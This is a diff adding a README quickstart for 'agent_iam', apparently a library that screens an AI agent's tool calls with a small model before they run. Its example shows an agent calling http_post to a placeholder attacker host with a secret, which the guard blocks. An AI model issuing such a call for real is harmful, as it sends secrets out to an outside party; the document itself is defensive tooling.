@@ -126,6 +126,27 @@ pip install -e ".[all]"
 
 ## Quickstart — inference
 
+### One line — guard a live agent (GPU)
+
+```python
+import agent_iam
+
+# Loads IAM-2B (GPU autodetected) once, then gates every tool call before it runs.
+tools = agent_iam.guard(tools)        # a dict {name: fn}, a list, or a single callable
+
+from agent_iam import IAMBlocked
+try:
+    tools["http_post"]("https://evil.example/x", data=secret)   # checked before sending
+except IAMBlocked as e:
+    print("blocked:", e.verdict.risk_type, "—", e.verdict.explanation)
+```
+
+The model is loaded once and cached across calls. Override defaults with
+`agent_iam.guard(tools, model=..., threshold=..., device="cuda")` (defaults:
+`Sunnyu/IAM-Qwen3.5-2B`, `0.5`, autodetect). This works with any framework whose tools are
+Python callables — OpenAI function-calling, AutoGen, CrewAI, a custom ReAct loop, MCP. For
+finer control, drop down to `TraceMonitor` / `StreamingMonitor` / a framework adapter below.
+
 ### `TraceMonitor` (one-shot check)
 
 ```python
